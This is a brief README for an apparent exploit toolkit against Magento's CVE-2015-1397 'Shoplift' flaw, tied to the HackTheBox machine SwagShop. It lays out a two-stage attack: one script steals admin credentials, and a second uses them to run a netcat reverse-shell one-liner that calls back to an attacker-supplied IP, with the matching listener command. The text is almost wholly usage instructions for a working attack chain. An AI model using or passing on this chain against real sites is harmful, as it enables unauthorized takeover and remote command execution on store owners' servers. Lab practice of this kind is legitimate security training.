# CVE-2015-1397-Magento-Shoplift

[Vulnerability Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1397)

Vulnerability as seen in HackTheBox - SwagShop

## Stage 1 = exploit.py
Gain administrator credentials to Magento CMS dashboard
## Stage 2 = post_auth.py
With credentials gained from exploit.py added to post_auth.py run: 
```bash
python3 post_auth.py http://TARGET.SITE/index.php/admin "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f"
```
Listener:
```bash
nc -lvnp 4444
```
